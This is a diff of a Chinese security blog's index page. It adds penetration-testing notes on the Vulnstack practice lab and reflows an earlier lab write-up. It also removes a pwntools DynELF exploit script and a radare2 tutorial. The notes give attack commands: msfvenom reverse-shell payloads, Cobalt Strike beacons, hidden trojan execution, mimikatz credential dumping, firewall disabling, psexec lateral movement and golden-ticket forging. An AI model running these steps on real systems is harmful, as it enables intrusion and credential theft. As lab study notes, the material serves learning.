@@ -231,6 +231,244 @@
 
 
   
+    <article id="post-note/rev/android-database-decryption" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/12/07/note/rev/android-database-decryption/" class="article-date">
+  	<time datetime="2020-12-07T11:06:30.000Z" itemprop="datePublished">2020-12-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/07/note/rev/android-database-decryption/">
+        高版本Android数据库加密分析
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Android系统采用SQLite数据库，应用数据库存储在/data/data/报名/databases目录下</p>
+<p>相关API为</p>
+<ul>
+<li>SQLiteOpenHelper</li>
+<li>-getReadableDatabase</li>
+<li>-getWritableDatabase</li>
+</ul>
+<p>相关资料</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://source.android.com/security/encryption/file-based">https://source.android.com/security/encryption/file-based</a></li>
+<li><a target="_blank" rel="noopener" href="https://source.android.com/security/encryption/metadata">https://source.android.com/security/encryption/metadata</a></li>
+<li><a target="_blank" rel="noopener" href="https://source.android.com/security/trusty">https://source.android.com/security/trusty</a></li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-note/web/pentist-2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/12/05/note/web/pentist-2/" class="article-date">
+  	<time datetime="2020-12-05T10:24:46.000Z" itemprop="datePublished">2020-12-05</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/05/note/web/pentist-2/">
+        靶机看答案渗透记录-2
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>参考资料 <a target="_blank" rel="noopener" href="https://cyzcc.vip/2020/07/14/Vulnstack%E4%BA%8C/">https://cyzcc.vip/2020/07/14/Vulnstack%E4%BA%8C/</a></p>
+<p>靶场地址 <a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>按照靶机说明把攻击机和WEB，PC放在同一网段内，WEB，PC，DC有私有网段</p>
+<p>管理员域\账户/密码是 DE1AY\Administrator/1qaz@WSX</p>
+<p>WEB机在C:\Oracle\Middleware\user_projects\domains\base_domain中有个startWebLogic，以管理员身份运行</p>
+<p>PC，WEB机计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server, Workstation, Computer Brower全部启动</p>
+<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><ol>
+<li>nmap扫一下对应网段，得到靶机地址，得到开放端口。有个7001端口，无论搜端口还是搜服务信息都是WebLogic。</li>
+<li><p>使用WebLogicscan进行扫描</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 WebLogicscan.py -u ip -p 7001</span><br></pre></td></tr></table></figure>
+<p>搜索到一个JAVA反序列化漏洞CVE-2019-2725</p>
+<p>网上查找漏洞利用信息，找到一个msf模块 exploit/multi/misc/weblogic_deserialize_asyncresponseservice</p>
+<p><a target="_blank" rel="noopener" href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-2725">https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-2725</a></p>
+</li>
+<li>利用模块，需要设置target,LHOST,RHOSTS，可以使用show options,show targets查看相关选项</li>
+<li>获取到了shell</li>
+</ol>
+<p>ctrl+z可以放后台</p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>cabaltstrike工具的使用</p>
+<ol>
+<li>建立teamserver ./teamserver 本机IP 连接密码</li>
+<li>启动cabaltstrike客户端，需要java8。连接teamserver。</li>
+<li>工具栏有个耳机图标，单击然后建立一个新的监听，监听4445端口</li>
+</ol>
+<p>msf进行如下操作</p>
+<ol>
+<li>use exploit/windows/local/payload_inject</li>
+<li>set payload windows/meterpreter/reverse_http</li>
+<li>set DisablePayloadHandler true</li>
+<li>set lhost ip</li>
+<li>set lport 4445 </li>
+<li>set session 1</li>
+<li>exploit</li>
+</ol>
+<p>这时再查看CS，已经连接上靶机了</p>
+<p>右键进入beacon界面即可执行命令(右键-&gt;interact)</p>
+<p>要执行shell命令直接在命令之前加shell，如shell dir</p>
+<ol>
+<li>创建监听器用于木马回连</li>
+<li>Attacks-&gt;Packages-&gt;Windows Executable根据靶机类型勾选生成木马</li>
+<li><p>在msf session中使用upload命令上传</p>
+<p>sessions 2</p>
+<p>upload /home/kali/Downloads/artifact.exe C:\Oracle\Middleware\user_projects\domains\base_domain\artifact.exe</p>
+</li>
+<li><p>execute命令执行木马，-H 不可见,-i交互</p>
+<p>execute -H -i -f artifact.exe</p>
+</li>
+<li><p>凭证获取</p>
+<p>在木马连接右键-&gt;access-&gt;dump hashes</p>
+<p>右键-&gt;access-&gt;run mimikatz</p>
+<p>再点击凭证信息</p>
+</li>
+</ol>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>右键-&gt;Access-&gt;提权Elevate</p>
+<p>ms14-058</p>
+<p>成功提升为system权限</p>
+<h2 id="域信息搜集"><a href="#域信息搜集" class="headerlink" title="域信息搜集"></a>域信息搜集</h2><ol>
+<li>获取当前组名 shell net view 需关闭靶机防火墙，否则出错<blockquote>
+<p>第一种 msf&gt; run post/windows/manage/enable_rdp<br>第二种 菜刀命令输入 netsh advfirewall set allprofiles state off</p>
+</blockquote>
+</li>
+<li>查看所有域 net view /domain</li>
+<li>查看IP信息 ipconfig /all</li>
+<li>查看域名 shell net config workstation</li>
+<li><p>查看域内机器IP</p>
+<p>net view</p>
+</li>
+<li><p>查询域控机器</p>
+<p>shell net group “Domain Controllers” /domain</p>
+</li>
+<li><p>查询域管理员</p>
+<p>shell net group “domain admins” /domain</p>
+</li>
+</ol>
+<h2 id="psexec-传递"><a href="#psexec-传递" class="headerlink" title="psexec 传递"></a>psexec 传递</h2><p>传递登陆的概念</p>
+<p>获取凭据后对模板网段进行活端口检测，因为是传递登陆，多以仅需检测445端口</p>
+<p>portscan ip网段 端口 协议 线程</p>
+<p>portscan 10.10.10.0/24 445 arp 200</p>
+<p>view-&gt;Targets查看端口探测后的存活主机</p>
+<p>新建Listener，Payload选择windows/beacon_smb/bind_pipe</p>
+<p>存活主机右键-&gt;Login-&gt;psexec，选择之前后去的凭据信息，选择Listener以及主机Session</p>
+<p>使用相同的方法让PC上线</p>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>在域控中获取KRBTGT账户NTLM密码hash和SID hashdump</p>
+<p>黄金票据</p>
+<p>WEB机Administrator -&gt;右键-&gt; Access-&gt;Golden Ticket</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>域是Windows管理本地网络的一组计算机，是Windows网络中的独立运行的单位</p>
+<p>域管理员可以设置组策略，域成员会统一应用这一组策略。可以统一安装软件，统一配置计算机</p>
+<p>只有Windows专业版和企业版可以连接到域</p>
+<p><strong>域控制器</strong>(DC)是域中负责控制的计算机，负责验证连入域网络计算机的验证工作，至少一台</p>
+<p>域环境中也有DNS，DNS负责支持DC，也负责帮助人找到DC</p>
+<p>域内计算机之间建立了信任关系，在域内访问其它机器，无需再被许可</p>
+<p>AD域</p>
+<h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>工作组中的每一台计算机独立管理自己资源，无法统一管理资源；一个账户只能登陆一台计算机；计算机之间是平等的；每一个计算机都在本地存储用户账户；规模一般小于10台计算机</p>
+<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>认证过程中，client与Kerberos服务器(Access Server)同心会得到TGT，带着TGT请求TGS，得到票据ticket，就可以访问应用服务器。</p>
+<p>黄金票据就是自己生成的TGT，生成过程中user,domain,timestamp和权限会经过krbtgt账户hash加密，所以有这些信息就可以生成票据。krbtgt账户不自动更新的，krbtgt需要域管理权限。有了黄金票据，就免除了向AS验证用户名和密码的阶段。</p>
+<p><strong>winlogin.exe</strong> 接收用户名，密码，域信息，传递给lsass.exe</p>
+<p><strong>lsass.exe</strong> 把经过kerberos处理的用户名密码域SAM进行对比验证，返回结果</p>
+<p><strong>SAM数据库</strong> 存储账号和密码hash的数据库</p>
+<p><strong>NetLogin</strong> 域认证加密信道</p>
+<p>查看域<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure></p>
+<p>查看账号信息簇，生成，导入都需要mimikatz</p>
+<p>检验缓存票据<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure><br>利用票据访问<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\xx.domain-name</span><br></pre></td></tr></table></figure></p>
+<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>是伪造的TGS，只能访问特定的服务器</p>
+<p>使用mimikatz生成，导入，管理等</p>
+<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>可以从lsass.exe处获取账号密码，或从文件中找到密码哈希值</p>
+<p>设置特权 privilege::debug</p>
+<p>获取本机用户名，口令，sid等，导出域 sekurlsa::logonpasswrods</p>
+<p>获得域控权限 需要ms14-068漏洞 ms14-068 -u -p -s -d</p>
+<p>生成缓存，导入伪造缓存 kerberos::ptc test.cache</p>
+<p>登陆：net use 导入的缓存</p>
+<p>导出lsass.dump sekurlsa::minidump lsass.dump<br>sekurlsa::logonPasswords full</p>
+<p>导出所有用户口令 lsadump::sam SYSTEM.hiv SAM.hiv</p>
+<p>net use \A-635ECAEE64804.TEST.LOCAL mimikatz /user：test</p>
+<p>生成黄金票据</p>
+<p>kerberos::golden /user:Administrator /domain:test.local/sid:S-1-5-21-2848411111-3820811111-1717111111/krbtgt:d3b949b1f4ef947820f0950111111111 /ticket:test.kirbi</p>
+<p>？？刷新扫雷记录？ minesweeper::Infos</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a3ddd7502c09">https://www.jianshu.com/p/a3ddd7502c09</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-note/papers/1-1" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -481,30 +719,54 @@
 <h2 id="找到后台"><a href="#找到后台" class="headerlink" title="找到后台"></a>找到后台</h2><p>发现系统是yxcms的，询问雪殇知道可以下载yxcms的源码审计，然后发现后台入口</p>
 <p>尝试弱密码admin/123456可以登陆</p>
 <h2 id="后台操作"><a href="#后台操作" class="headerlink" title="后台操作"></a>后台操作</h2><ol>
-<li>有个sql执行可以执行某些操作</li>
-<li>修改首页模板，index.php可以添加一句话木马， 使用weevely访问失败，但是可以使用 <a target="_blank" rel="noopener" href="https://doc.u0u.us/zh-hans/getting_started/get_antsword.html">AntSword</a> 访问</li>
+<li><p>有个sql执行可以执行某些操作</p>
+</li>
+<li><p>修改首页模板，index.php可以添加一句话木马， 使用weevely访问失败，但是可以使用 <a target="_blank" rel="noopener" href="https://doc.u0u.us/zh-hans/getting_started/get_antsword.html">AntSword</a> 访问</p>
+</li>
 <li><p>有个gethash的工具可以获取windows上面密码的hash值，但是没下到<br>网上找到一个渗透工具集，好家伙<del>白嫖真爽</del></p>
 <p>pwdump也可以获取hash，获取到了hash</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">liukaifeng01:1000:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br></pre></td></tr></table></figure></li>
-<li>虽然找到了hash值，但是没有找到密码</li>
-<li>开启了3306端口，可以尝试连接，但是连接失败，不允许连接</li>
-<li>使用msf生成木马<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.117 lport=4444 -f exe -o /root/桌面/hakcer.exe</span><br></pre></td></tr></table></figure>
-kali下可以使用msfpc简化<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfpc windows reverse eth1 4444</span><br></pre></td></tr></table></figure></li>
-<li>msf使用exploit/multi/handler模块<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set LPORT 4444</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-上传生成的木马到靶机，执行，连接成功，执行sysinfo命令测试是否成功</li>
-<li>run vnc进行桌面监控</li>
-<li>run autoroute -s 192.168.52.1/24<br> 这条命令允许攻击机进入192.168.52.1/24子网</li>
-<li>arp -a查看域控成员</li>
-<li>使用background把当前session保存至后台</li>
-<li>扫描远端IP<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">set RHOSTS 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li>
-<li>开放了445端口，ms17_010漏洞，大佬说蓝屏，还没试</li>
-<li>ms08_067攻击失败</li>
-<li>再次连接win7，使用load mimikatz获得凭证</li>
-<li>getsystem命令 sysinfo命令 ps命令</li>
-<li>migrate命令，explorer为2872</li>
-<li>之前load了mimikatz(kiwi)插件，然后执行creds_tspkg获取域控密码，新版本msf变了，遇事不决help</li>
-<li>使用run post/windows/manage/enable_rdp开启windows的rdp远程桌面</li>
-<li>linux使用rdesktop连接，windows直接使用远程桌面连接<br>用户名和密码为Administrator/hongrisec@2019</li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">liukaifeng01:1000:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>虽然找到了hash值，但是没有找到密码</p>
+</li>
+<li><p>开启了3306端口，可以尝试连接，但是连接失败，不允许连接</p>
+</li>
+<li><p>使用msf生成木马</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.117 lport=4444 -f exe -o /root/桌面/hakcer.exe</span><br></pre></td></tr></table></figure>
+<p>kali下可以使用msfpc简化</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfpc windows reverse eth1 4444</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>msf使用exploit/multi/handler模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set LPORT 4444</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>上传生成的木马到靶机，执行，连接成功，执行sysinfo命令测试是否成功</p>
+</li>
+<li><p>run vnc进行桌面监控</p>
+</li>
+<li><p>run autoroute -s 192.168.52.1/24<br> 这条命令允许攻击机进入192.168.52.1/24子网</p>
+</li>
+<li><p>arp -a查看域控成员</p>
+</li>
+<li><p>使用background把当前session保存至后台</p>
+</li>
+<li><p>扫描远端IP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">set RHOSTS 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>开放了445端口，ms17_010漏洞，大佬说蓝屏，还没试</p>
+</li>
+<li><p>ms08_067攻击失败</p>
+</li>
+<li><p>再次连接win7，使用load mimikatz获得凭证</p>
+</li>
+<li><p>getsystem命令 sysinfo命令 ps命令</p>
+</li>
+<li><p>migrate命令，explorer为2872</p>
+</li>
+<li><p>之前load了mimikatz(kiwi)插件，然后执行creds_tspkg获取域控密码，新版本msf变了，遇事不决help</p>
+</li>
+<li><p>使用run post/windows/manage/enable_rdp开启windows的rdp远程桌面</p>
+</li>
+<li><p>linux使用rdesktop连接，windows直接使用远程桌面连接<br>用户名和密码为Administrator/hongrisec@2019</p>
+</li>
 </ol>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
 <li>知道系统相关信息之后可以下载相关源码进行审计发现漏洞。从而找到管理登陆页面，弱密码等</li>
@@ -761,162 +1023,6 @@ kali下可以使用msfpc简化<figure class="highlight sh"><table><tr><td class=
 <p>itertools.permutations 返回对象的全排列，第二个参数指出数量<br>dedecms如果不允许上传文件会返回Upload filetype not allow !<br>post请求方式中带有_FILES[mochazz][tmp_name] 表示上传<br>adminer配置文件在common.inc.php<br>sql注入注释绕过//%0A select &lt;?php //%0Aphpinfo()?&gt;<br>哥斯拉的马</p>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2></blockquote>
 <p>[1] <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/XYZWlIZQLgA86tJPiOpM6A">记一次偶遇Adminer </a></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-note/pwn/dynelf" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/11/10/note/pwn/dynelf/" class="article-date">
-  	<time datetime="2020-11-10T02:42:54.000Z" itemprop="datePublished">2020-11-10</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/10/note/pwn/dynelf/">
-        使用dynelf泄露地址
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload =<span class="string">&#x27;\x00&#x27;</span>*<span class="number">7</span>+p16(<span class="number">0xE7</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">func_addr = <span class="number">0x80487d0</span></span><br><span class="line">write_addr = <span class="number">0x8048578</span></span><br><span class="line">pppr_addr = <span class="number">0x080488f9</span></span><br><span class="line">write_symbol = <span class="number">0x8049FEC</span></span><br><span class="line">// 需要可持续性的泄露</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xeb</span>+p32(write_addr)+p32(pppr_addr)+p32(<span class="number">1</span>)+p32(addr)+p32(<span class="number">4</span>)+p32(func_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0xE7</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    res = p.recv()[:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">d = DynELF(leak,elf=elf)</span><br><span class="line"></span><br><span class="line">sys_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh = d.lookup(<span class="string">&#x27;str_bin_sh&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xeb</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;sys_addr: 0x%08x,binsh: 0x%08x&quot;</span>,sys_addr,p64(<span class="number">0</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-note/rev/radare2" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/11/09/note/rev/radare2/" class="article-date">
-  	<time datetime="2020-11-09T15:33:31.000Z" itemprop="datePublished">2020-11-09</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/09/note/rev/radare2/">
-        radare2使用
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>radare2 nb!!!</p>
-<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a target="_blank" rel="noopener" href="https://github.com/radareorg/radare2">radare2</a>是类unix逆向框架和命令行工具箱</p>
-<p><a target="_blank" rel="noopener" href="https://book.rada.re/">官方book</a></p>
-<ul>
-<li>rax2 数值转换</li>
-<li>rasm2 汇编和反汇编</li>
-<li>rabin2 查看文件格式</li>
-<li>radiff2 对文件进行diff</li>
-<li>ragg2/ragg2cc 方便生成shellcode</li>
-<li>rahash2 各种密码hash算法</li>
-<li>radare2 整合上面工具</li>
-</ul>
-<p>此外还有radare2其它的套件</p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="rax2"><a href="#rax2" class="headerlink" title="rax2"></a>rax2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rax2 -h</span><br></pre></td></tr></table></figure>
-<p>里面说的很明白了</p>
-<h3 id="rasm2"><a href="#rasm2" class="headerlink" title="rasm2"></a>rasm2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rasm2 -L | grep head <span class="comment"># 列出前几项支持的架构</span></span><br><span class="line">rasm2 -a arm <span class="string">&quot;nop;nop;nop&quot;</span> <span class="comment"># -a用于指出架构类型</span></span><br><span class="line"><span class="comment"># 0000a0e10000a0e10000a0e1</span></span><br><span class="line">rasm2 -a arm -d <span class="string">&quot;0000a0e10000a0e10000a0e1&quot;</span> <span class="comment"># -d用于指出反汇编操作</span></span><br><span class="line"><span class="comment"># mov r0, r0</span></span><br><span class="line"><span class="comment"># mov r0, r0</span></span><br><span class="line"><span class="comment"># mov r0, r0</span></span><br><span class="line">rasm2 -a arm -b 64 <span class="string">&quot;nop;nop;nop&quot;</span> <span class="comment"># -b用于指出位数</span></span><br><span class="line"><span class="comment"># 1f2003d51f2003d51f2003d5</span></span><br><span class="line">rasm2 -a arm -b 64 -d <span class="string">&quot;1f2003d51f2003d51f2003d5&quot;</span> -r <span class="comment"># -r表示在radare2中实现对应功能的命令</span></span><br></pre></td></tr></table></figure>
-<h3 id="rabin2"><a href="#rabin2" class="headerlink" title="rabin2"></a>rabin2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rabin2 -I a.out <span class="comment"># 显示文件信息</span></span><br><span class="line">rabin2 -zz a.out <span class="comment"># 显示文件中的字符串，包含utf-8等宽字符串</span></span><br><span class="line">rabin2 -O? <span class="comment"># 显示-O选项的帮助，-O用于更改文件属性</span></span><br><span class="line">rabin2 -S a.out | grep text <span class="comment"># -S用于显示文件属性</span></span><br><span class="line">rabin2 -O p/.text/r a.out <span class="comment"># 修改text段为只读</span></span><br><span class="line">rabin2 -S a.out | grep text</span><br></pre></td></tr></table></figure>
-<h3 id="radiff2"><a href="#radiff2" class="headerlink" title="radiff2"></a>radiff2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">radiff2 -h</span><br></pre></td></tr></table></figure>
-<h3 id="ragg2-ragg2cc"><a href="#ragg2-ragg2cc" class="headerlink" title="ragg2/ragg2cc"></a>ragg2/ragg2cc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    write(<span class="number">1</span>,<span class="string">&quot;hi\n&quot;</span>,<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ragg2 -ax86 -b32 1.c</span><br></pre></td></tr></table></figure>
-<p>还可以编译.r文件(ragg2语言)</p>
-<h3 id="rahash2"><a href="#rahash2" class="headerlink" title="rahash2"></a>rahash2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rahash2 -h </span><br><span class="line">rahash2 -a md5 -s admin</span><br></pre></td></tr></table></figure>
-<h3 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a>radare2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r2 bin <span class="comment"># 进入程序，-d进入debug模式</span></span><br><span class="line">radare2 bin</span><br></pre></td></tr></table></figure>
